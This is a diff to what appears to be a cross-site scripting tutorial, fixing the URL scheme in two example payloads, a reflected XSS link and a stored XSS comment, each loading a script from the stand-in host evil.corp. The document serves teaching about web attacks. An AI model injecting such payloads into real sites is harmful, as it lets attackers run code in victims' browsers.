@@ -202,7 +202,7 @@ Reflected XSS occurs when user input is immediately returned by a web applicatio
 
 Example:
 ```html
-https://insecure-web.com/comment?message=<script src=https//evil.corp/badscript.js></script>
+https://insecure-web.com/comment?message=<script src=https://evil.corp/badscript.js></script>
 ```
 
 ---
@@ -217,7 +217,7 @@ Stored XSS generally occurs when user input is stored on the target server, such
 
  Instead of a decent comment on the blog's input field, the attacker write:
 ```html
-<script src='https//evil.corp/badscript.js'/>
+<script src='https://evil.corp/badscript.js'/>
 ```
 
 ---
